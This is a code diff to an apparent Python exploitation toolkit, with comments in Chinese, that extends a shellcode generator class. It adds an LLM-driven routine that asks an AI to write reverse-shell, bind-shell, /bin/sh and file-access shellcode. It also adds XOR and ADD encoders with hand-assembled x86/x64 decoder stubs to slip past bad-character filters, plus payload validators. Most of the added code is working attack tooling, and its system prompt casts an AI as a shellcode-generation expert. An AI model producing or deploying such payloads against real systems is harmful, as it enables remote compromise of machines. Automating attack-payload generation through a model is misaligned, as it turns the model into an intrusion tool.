@@ -9,6 +9,7 @@ import re
 import os
 import subprocess
 import struct
+import json
 from typing import Dict, List, Optional, Tuple, Any
 from dataclasses import dataclass
 from enum import Enum
@@ -496,10 +497,10 @@ class ShellcodeGenerator:
     """
     Shellcode生成器
 
-    生成各种架构的shellcode
+    生成各种架构的shellcode，支持AI动态生成和验证
     """
 
-    # 预定义shellcode
+    # 预定义shellcode模板（保留基本模板）
     SHELLCODES = {
         'x64_linux': {
             'execve_binsh': (
@@ -530,7 +531,20 @@ class ShellcodeGenerator:
                 b'\xb0\x0b'                   # mov al, 11
                 b'\xcd\x80'                   # int 0x80
             )
+        },
+        'arm_linux': {
+            'execve_binsh': None,  # 需要AI生成
         }
+    }
+
+    # 禁止字符映射表（用于过滤）
+    BAD_CHAR_ENCODINGS = {
+        'null': b'\x00',
+        'newline': b'\x0a\x0d',
+        'space': b'\x20',
+        'slash': b'\x2f',
+        'backslash': b'\x5c',
+        'quote': b'\x22\x27',
     }
 
     @classmethod
@@ -540,7 +554,7 @@ class ShellcodeGenerator:
         获取shellcode
 
         Args:
-            arch: 架构 (x64, x86)
+            arch: 架构 (x64, x86, arm)
             os_type: 操作系统 (linux)
             shellcode_type: shellcode类型
 
@@ -587,6 +601,646 @@ class ShellcodeGenerator:
             # 目前返回占位符
             return b'\x90' * 50  # NOP sled as placeholder
         return b''
+
+    @classmethod
+    def ai_generate_shellcode(cls,
+                              arch: str = 'x64',
+                              os_type: str = 'linux',
+                              target_type: str = 'execve_binsh',
+                              bad_chars: List[str] = None,
+                              port: int = None,
+                              ip: str = None,
+                              filename: str = None,
+                              custom_requirements: str = None) -> Dict:
+        """
+        AI动态生成shellcode
+
+        Args:
+            arch: 目标架构 (x64, x86, arm, arm64, mips)
+            os_type: 操作系统 (linux, windows)
+            target_type: shellcode类型
+                - execve_binsh: 执行/bin/sh
+                - reverse_shell: 反弹shell
+                - read_file: 读取文件
+                - write_file: 写入文件
+                - bind_shell: 绑定shell端口
+                - custom: 自定义功能
+            bad_chars: 禁止字符列表 (如 ['\x00', '\x0a', '\x20'])
+            port: 端口号 (用于reverse_shell/bind_shell)
+            ip: 目标IP (用于reverse_shell)
+            filename: 文件名 (用于read_file/write_file)
+            custom_requirements: 自定义需求描述
+
+        Returns:
+            Dict: {
+                'success': bool,
+                'shellcode': bytes,  # 生成的shellcode
+                'shellcode_hex': str,  # 十六进制字符串
+                'length': int,
+                'bad_chars_filtered': bool,  # 是否过滤了禁止字符
+                'validation': Dict,  # 验证结果
+                'explanation': str,  # AI解释
+                'error': str  # 错误信息(如果失败)
+            }
+        """
+        try:
+            from llm_client import llm_client
+            from config import config
+        except ImportError:
+            return {
+                'success': False,
+                'error': 'LLM client not available',
+                'fallback': cls._fallback_generate(arch, os_type, target_type)
+            }
+
+        # 构建AI提示
+        prompt = cls._build_shellcode_prompt(
+            arch=arch,
+            os_type=os_type,
+            target_type=target_type,
+            bad_chars=bad_chars,
+            port=port,
+            ip=ip,
+            filename=filename,
+            custom_requirements=custom_requirements
+        )
+
+        try:
+            response = llm_client.call_chat_completion(
+                model=config.ANALYST_MODEL,
+                messages=[
+                    {
+                        "role": "system",
+                        "content": """你是一个专业的shellcode生成专家。你需要生成正确、高效的机器码。
+规则：
+1. 只输出JSON格式
+2. shellcode必须是可执行的机器码
+3. 必须处理所有禁止字符
+4. 提供详细的代码解释
+5. 确保shellcode在目标架构上可运行"""
+                    },
+                    {
+                        "role": "user",
+                        "content": prompt
+                    }
+                ],
+                temperature=0.1,
+                json_mode=True,
+                timeout=60
+            )
+
+            import json
+            if "```json" in response:
+                response = response.split("```json")[1].split("```")[0]
+
+            result = json.loads(response.strip())
+
+            # 解析并验证shellcode
+            shellcode_hex = result.get('shellcode_hex', '')
+            shellcode = bytes.fromhex(shellcode_hex) if shellcode_hex else None
+
+            if shellcode:
+                # 验证shellcode
+                validation = cls.validate_shellcode(
+                    shellcode=shellcode,
+                    arch=arch,
+                    bad_chars=bad_chars
+                )
+
+                # 检查禁止字符过滤
+                bad_chars_filtered = validation.get('bad_chars_clean', False)
+
+                # 如果有禁止字符，尝试编码
+                if not bad_chars_filtered and bad_chars:
+                    encoded_result = cls._encode_shellcode(shellcode, bad_chars, arch)
+                    if encoded_result['success']:
+                        shellcode = encoded_result['shellcode']
+                        bad_chars_filtered = True
+                        validation = cls.validate_shellcode(shellcode, arch, bad_chars)
+
+                return {
+                    'success': True,
+                    'shellcode': shellcode,
+                    'shellcode_hex': shellcode.hex(),
+                    'length': len(shellcode),
+                    'bad_chars_filtered': bad_chars_filtered,
+                    'validation': validation,
+                    'explanation': result.get('explanation', ''),
+                    'registers_used': result.get('registers_used', []),
+                    'syscalls': result.get('syscalls', [])
+                }
+            else:
+                return {
+                    'success': False,
+                    'error': 'AI returned empty shellcode',
+                    'fallback': cls._fallback_generate(arch, os_type, target_type)
+                }
+
+        except Exception as e:
+            import logging
+            logging.getLogger("Pwn").warning(f"[AI Shellcode] 生成失败: {e}")
+            return {
+                'success': False,
+                'error': str(e),
+                'fallback': cls._fallback_generate(arch, os_type, target_type)
+            }
+
+    @classmethod
+    def _build_shellcode_prompt(cls,
+                               arch: str,
+                               os_type: str,
+                               target_type: str,
+                               bad_chars: List[str],
+                               port: int,
+                               ip: str,
+                               filename: str,
+                               custom_requirements: str) -> str:
+        """构建AI生成提示"""
+        arch_info = {
+            'x64': {'bits': 64, 'registers': ['rax', 'rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'], 'syscall_reg': 'rax'},
+            'x86': {'bits': 32, 'registers': ['eax', 'ebx', 'ecx', 'edx'], 'syscall_reg': 'eax'},
+            'arm': {'bits': 32, 'registers': ['r0', 'r1', 'r2', 'r3', 'r4'], 'syscall_reg': 'r7'},
+            'arm64': {'bits': 64, 'registers': ['x0', 'x1', 'x2', 'x3', 'x8'], 'syscall_reg': 'x8'},
+            'mips': {'bits': 32, 'registers': ['v0', 'a0', 'a1', 'a2', 'a3'], 'syscall_reg': 'v0'}
+        }
+
+        target_descriptions = {
+            'execve_binsh': '执行 /bin/sh 获取shell',
+            'reverse_shell': f'连接到 {ip}:{port} 反弹shell',
+            'bind_shell': f'绑定shell到端口 {port}',
+            'read_file': f'读取文件 {filename} 并输出到stdout',
+            'write_file': f'写入文件 {filename}',
+            'custom': custom_requirements or '自定义功能'
+        }
+
+        syscall_tables = {
+            'x64_linux': {'execve': 59, 'read': 0, 'write': 1, 'open': 2, 'socket': 41, 'connect': 42, 'dup2': 33},
+            'x86_linux': {'execve': 11, 'read': 3, 'write': 4, 'open': 5, 'socket': 102, 'connect': 102, 'dup2': 63}
+        }
+
+        prompt = f"""
+生成shellcode机器码。
+
+## 目标环境
+- 架构: {arch} ({arch_info.get(arch, {}).get('bits', 64)}位)
+- 操作系统: {os_type}
+- 可用寄存器: {arch_info.get(arch, {}).get('registers', [])}
+
+## 目标功能
+{target_descriptions.get(target_type, target_type)}
+
+## 系统调用号参考 (如果需要)
+{json.dumps(syscall_tables.get(f'{arch}_{os_type}', {}), indent=2)}
+
+## 禁止字符 (必须避免)
+{json.dumps(bad_chars, indent=2) if bad_chars else '无特殊限制'}
+
+## 参数
+- 端口: {port if port else 'N/A'}
+- IP: {ip if ip else 'N/A'}
+- 文件名: {filename if filename else 'N/A'}
+
+## 输出格式 (JSON)
+{{
+    "shellcode_hex": "生成的shellcode十六进制字符串（纯机器码，不要空格）",
+    "length": shellcode字节数,
+    "explanation": "逐行解释shellcode的功能",
+    "registers_used": ["使用的寄存器列表"],
+    "syscalls": ["使用的系统调用列表"],
+    "bad_chars_handled": true/false,
+    "encoding_method": "使用的编码方法(如有)"
+}}
+"""
+        return prompt
+
+    @classmethod
+    def _fallback_generate(cls, arch: str, os_type: str, target_type: str) -> Dict:
+        """AI生成失败时的降级方案"""
+        shellcode = cls.get_shellcode(arch, os_type, target_type)
+        if shellcode:
+            return {
+                'success': True,
+                'shellcode': shellcode,
+                'shellcode_hex': shellcode.hex(),
+                'length': len(shellcode),
+                'source': 'fallback_template',
+                'note': '使用预定义模板，可能包含禁止字符'
+            }
+        return {
+            'success': False,
+            'error': f'No template available for {arch}_{os_type}_{target_type}'
+        }
+
+    @classmethod
+    def validate_shellcode(cls,
+                          shellcode: bytes,
+                          arch: str = 'x64',
+                          bad_chars: List[str] = None) -> Dict:
+        """
+        验证shellcode有效性
+
+        Args:
+            shellcode: shellcode字节
+            arch: 目标架构
+            bad_chars: 禁止字符列表
+
+        Returns:
+            Dict: {
+                'valid': bool,
+                'length': int,
+                'bad_chars_found': List[str],  # 发现的禁止字符
+                'bad_chars_clean': bool,  # 是否无禁止字符
+                'warnings': List[str],  # 警告信息
+                'arch_check': Dict  # 架构检查结果
+            }
+        """
+        result = {
+            'valid': True,
+            'length': len(shellcode),
+            'bad_chars_found': [],
+            'bad_chars_clean': True,
+            'warnings': [],
+            'arch_check': {}
+        }
+
+        # 检查shellcode长度
+        if len(shellcode) == 0:
+            result['valid'] = False
+            result['warnings'].append('Shellcode is empty')
+            return result
+
+        # 检查禁止字符
+        if bad_chars:
+            for char in bad_chars:
+                if isinstance(char, str):
+                    char_bytes = char.encode('latin-1')
+                else:
+                    char_bytes = bytes([char]) if isinstance(char, int) else char
+
+                if char_bytes in shellcode:
+                    result['bad_chars_found'].append(char)
+                    result['bad_chars_clean'] = False
+
+        # 架构特定检查
+        if arch in ['x64', 'x86']:
+            result['arch_check'] = cls._validate_x86_shellcode(shellcode, arch)
+        elif arch in ['arm', 'arm64']:
+            result['arch_check'] = cls._validate_arm_shellcode(shellcode, arch)
+
+        # 常见问题检查
+        if b'\x00' in shellcode:
+            result['warnings'].append('Contains null bytes (may cause issues in string operations)')
+
+        # 检查可能的无效指令模式
+        invalid_patterns = [
+            b'\xff\xff\xff\xff',  # 全FF可能是填充
+            b'\xcc\xcc\xcc\xcc',  # int3断点
+        ]
+        for pattern in invalid_patterns:
+            if pattern in shellcode:
+                result['warnings'].append(f'Contains potentially problematic pattern: {pattern.hex()}')
+
+        return result
+
+    @classmethod
+    def _validate_x86_shellcode(cls, shellcode: bytes, arch: str) -> Dict:
+        """验证x86/x64 shellcode"""
+        check = {
+            'arch': arch,
+            'syscall_instructions': [],
+            'potential_syscalls': 0
+        }
+
+        # 查找syscall指令
+        if arch == 'x64':
+            syscall_pattern = b'\x0f\x05'  # syscall
+            int80_pattern = b'\xcd\x80'    # int 0x80 (32-bit compat)
+        else:
+            syscall_pattern = b'\x0f\x05'
+            int80_pattern = b'\xcd\x80'    # int 0x80
+
+        idx = 0
+        while idx < len(shellcode):
+            pos = shellcode.find(syscall_pattern, idx)
+            if pos != -1:
+                check['syscall_instructions'].append(f'syscall at offset {pos}')
+                check['potential_syscalls'] += 1
+                idx = pos + 2
+            else:
+                break
+
+        idx = 0
+        while idx < len(shellcode):
+            pos = shellcode.find(int80_pattern, idx)
+            if pos != -1:
+                check['syscall_instructions'].append(f'int 0x80 at offset {pos}')
+                check['potential_syscalls'] += 1
+                idx = pos + 2
+            else:
+                break
+
+        return check
+
+    @classmethod
+    def _validate_arm_shellcode(cls, shellcode: bytes, arch: str) -> Dict:
+        """验证ARM shellcode"""
+        check = {
+            'arch': arch,
+            'svc_instructions': [],
+            'potential_syscalls': 0
+        }
+
+        # 查找svc (supervisor call) 指令
+        # ARM: svc #0 = \x00\x00\x00\xef (little endian)
+        # ARM64: svc #0 = \x01\x00\x00\xd4
+        if arch == 'arm':
+            svc_pattern = b'\x00\x00\x00\xef'
+        else:  # arm64
+            svc_pattern = b'\x01\x00\x00\xd4'
+
+        idx = 0
+        while idx < len(shellcode):
+            pos = shellcode.find(svc_pattern, idx)
+            if pos != -1:
+                check['svc_instructions'].append(f'svc #0 at offset {pos}')
+                check['potential_syscalls'] += 1
+                idx = pos + 4
+            else:
+                break
+
+        return check
+
+    @classmethod
+    def _encode_shellcode(cls, shellcode: bytes, bad_chars: List[str], arch: str) -> Dict:
+        """
+        对shellcode进行编码以避免禁止字符
+
+        支持多种编码方法:
+        - XOR编码
+        - ADD编码
+        - 字母数字编码
+        """
+        result = {
+            'success': False,
+            'shellcode': None,
+            'decoder_stub': None,
+            'method': None
+        }
+
+        if not bad_chars:
+            return result
+
+        # 转换禁止字符为字节集合
+        bad_bytes = set()
+        for char in bad_chars:
+            if isinstance(char, str):
+                bad_bytes.update(char.encode('latin-1'))
+            elif isinstance(char, int):
+                bad_bytes.add(char)
+            else:
+                bad_bytes.update(char)
+
+        # 尝试XOR编码
+        xor_result = cls._xor_encode(shellcode, bad_bytes, arch)
+        if xor_result['success']:
+            return xor_result
+
+        # 尝试ADD编码
+        add_result = cls._add_encode(shellcode, bad_bytes, arch)
+        if add_result['success']:
+            return add_result
+
+        return result
+
+    @classmethod
+    def _xor_encode(cls, shellcode: bytes, bad_bytes: set, arch: str) -> Dict:
+        """XOR编码"""
+        # 寻找可用的XOR密钥
+        for key in range(1, 256):
+            if key in bad_bytes:
+                continue
+
+            # 检查编码后是否有禁止字符
+            encoded = bytes(b ^ key for b in shellcode)
+            has_bad = any(b in bad_bytes for b in encoded)
+
+            if not has_bad:
+                # 构建decoder stub
+                if arch == 'x64':
+                    decoder = cls._build_xor_decoder_x64(key, len(shellcode))
+                elif arch == 'x86':
+                    decoder = cls._build_xor_decoder_x86(key, len(shellcode))
+                else:
+                    continue
+
+                # 检查decoder是否包含禁止字符
+                if not any(b in bad_bytes for b in decoder):
+                    return {
+                        'success': True,
+                        'shellcode': decoder + encoded,
+                        'decoder_stub': decoder.hex(),
+                        'method': 'xor',
+                        'key': key
+                    }
+
+        return {'success': False}
+
+    @classmethod
+    def _add_encode(cls, shellcode: bytes, bad_bytes: set, arch: str) -> Dict:
+        """ADD编码"""
+        # 寻找可用的ADD偏移
+        for offset in range(1, 128):
+            # 检查编码后是否有禁止字符
+            encoded = bytes((b + offset) % 256 for b in shellcode)
+            has_bad = any(b in bad_bytes for b in encoded)
+
+            if not has_bad:
+                # 构建decoder stub
+                if arch == 'x64':
+                    decoder = cls._build_add_decoder_x64(offset, len(shellcode))
+                elif arch == 'x86':
+                    decoder = cls._build_add_decoder_x86(offset, len(shellcode))
+                else:
+                    continue
+
+                if not any(b in bad_bytes for b in decoder):
+                    return {
+                        'success': True,
+                        'shellcode': decoder + encoded,
+                        'decoder_stub': decoder.hex(),
+                        'method': 'add',
+                        'offset': offset
+                    }
+
+        return {'success': False}
+
+    @classmethod
+    def _build_xor_decoder_x64(cls, key: int, length: int) -> bytes:
+        """构建x64 XOR decoder stub"""
+        # 简化的decoder stub
+        # 注意：这是一个基础实现，实际使用时可能需要调整
+        stub = b''
+        stub += b'\xeb\x10'             # jmp short get_data
+        # decoder:
+        stub += b'\x5e'                 # pop rsi (data address)
+        stub += b'\x31\xc9'             # xor ecx, ecx
+        stub += b'\x66\x81\xc1'         # add cx,
+        stub += length.to_bytes(2, 'little')  # length
+        stub += b'\x80\x36' + bytes([key])    # xor byte [rsi], key
+        stub += b'\x48\xff\xc6'         # inc rsi
+        stub += b'\xe2\xf9'             # loop xor_loop
+        stub += b'\xeb\x05'             # jmp shellcode
+        # get_data:
+        stub += b'\xe8\xeb\xff\xff\xff' # call decoder
+
+        return stub
+
+    @classmethod
+    def _build_xor_decoder_x86(cls, key: int, length: int) -> bytes:
+        """构建x86 XOR decoder stub"""
+        stub = b''
+        stub += b'\xeb\x0e'             # jmp short get_data
+        # decoder:
+        stub += b'\x5e'                 # pop esi
+        stub += b'\x31\xc9'             # xor ecx, ecx
+        stub += b'\x66\x81\xc1'         # add cx,
+        stub += length.to_bytes(2, 'little')  # length
+        stub += b'\x80\x36' + bytes([key])    # xor byte [esi], key
+        stub += b'\x46'                 # inc esi
+        stub += b'\xe2\xf9'             # loop xor_loop
+        stub += b'\xeb\x05'             # jmp shellcode
+        # get_data:
+        stub += b'\xe8\xed\xff\xff\xff' # call decoder
+
+        return stub
+
+    @classmethod
+    def _build_add_decoder_x64(cls, offset: int, length: int) -> bytes:
+        """构建x64 ADD decoder stub"""
+        stub = b''
+        stub += b'\xeb\x10'             # jmp short get_data
+        # decoder:
+        stub += b'\x5e'                 # pop rsi
+        stub += b'\x31\xc9'             # xor ecx, ecx
+        stub += b'\x66\x81\xc1'         # add cx,
+        stub += length.to_bytes(2, 'little')  # length
+        stub += b'\x80\x2e' + bytes([offset]) # sub byte [rsi], offset
+        stub += b'\x48\xff\xc6'         # inc rsi
+        stub += b'\xe2\xf9'             # loop sub_loop
+        stub += b'\xeb\x05'             # jmp shellcode
+        # get_data:
+        stub += b'\xe8\xeb\xff\xff\xff' # call decoder
+
+        return stub
+
+    @classmethod
+    def _build_add_decoder_x86(cls, offset: int, length: int) -> bytes:
+        """构建x86 ADD decoder stub"""
+        stub = b''
+        stub += b'\xeb\x0e'             # jmp short get_data
+        # decoder:
+        stub += b'\x5e'                 # pop esi
+        stub += b'\x31\xc9'             # xor ecx, ecx
+        stub += b'\x66\x81\xc1'         # add cx,
+        stub += length.to_bytes(2, 'little')  # length
+        stub += b'\x80\x2e' + bytes([offset]) # sub byte [esi], offset
+        stub += b'\x46'                 # inc esi
+        stub += b'\xe2\xf9'             # loop sub_loop
+        stub += b'\xeb\x05'             # jmp shellcode
+        # get_data:
+        stub += b'\xe8\xed\xff\xff\xff' # call decoder
+
+        return stub
+
+    @classmethod
+    def generate_with_encoder(cls,
+                              target_type: str = 'execve_binsh',
+                              arch: str = 'x64',
+                              bad_chars: List[str] = None,
+                              encoder: str = 'auto') -> Dict:
+        """
+        生成带编码器的shellcode
+
+        Args:
+            target_type: shellcode类型
+            arch: 架构
+            bad_chars: 禁止字符
+            encoder: 编码器类型 ('auto', 'xor', 'alpha', 'unicode')
+
+        Returns:
+            Dict包含生成的shellcode和编码信息
+        """
+        # 首先获取基础shellcode
+        base_shellcode = cls.get_shellcode(arch, 'linux', target_type)
+
+        if not base_shellcode:
+            # 尝试AI生成
+            ai_result = cls.ai_generate_shellcode(
+                arch=arch,
+                os_type='linux',
+                target_type=target_type,
+                bad_chars=bad_chars
+            )
+            if ai_result.get('success'):
+                return ai_result
+            return {
+                'success': False,
+                'error': f'Cannot generate shellcode for {target_type} on {arch}'
+            }
+
+        # 检查是否需要编码
+        if bad_chars:
+            bad_bytes = set()
+            for char in bad_chars:
+                if isinstance(char, str):
+                    bad_bytes.update(char.encode('latin-1'))
+                elif isinstance(char, int):
+                    bad_bytes.add(char)
+                else:
+                    bad_bytes.update(char)
+
+            has_bad_chars = any(b in bad_bytes for b in base_shellcode)
+
+            if has_bad_chars:
+                # 尝试编码
+                if encoder == 'auto':
+                    # 自动选择编码器
+                    encoded = cls._encode_shellcode(base_shellcode, bad_chars, arch)
+                    if encoded['success']:
+                        return {
+                            'success': True,
+                            'shellcode': encoded['shellcode'],
+                            'shellcode_hex': encoded['shellcode'].hex(),
+                            'length': len(encoded['shellcode']),
+                            'base_length': len(base_shellcode),
+                            'encoded': True,
+                            'encoder': encoded['method'],
+                            'validation': cls.validate_shellcode(encoded['shellcode'], arch, bad_chars)
+                        }
+                else:
+                    # 指定编码器
+                    if encoder == 'xor':
+                        encoded = cls._xor_encode(base_shellcode, bad_bytes, arch)
+                        if encoded['success']:
+                            return {
+                                'success': True,
+                                'shellcode': encoded['shellcode'],
+                                'shellcode_hex': encoded['shellcode'].hex(),
+                                'length': len(encoded['shellcode']),
+                                'encoded': True,
+                                'encoder': 'xor',
+                                'key': encoded.get('key')
+                            }
+
+        # 无需编码或编码失败，返回原始shellcode
+        return {
+            'success': True,
+            'shellcode': base_shellcode,
+            'shellcode_hex': base_shellcode.hex(),
+            'length': len(base_shellcode),
+            'encoded': False,
+            'validation': cls.validate_shellcode(base_shellcode, arch, bad_chars)
+        }
 
 
 class ExploitBuilder:
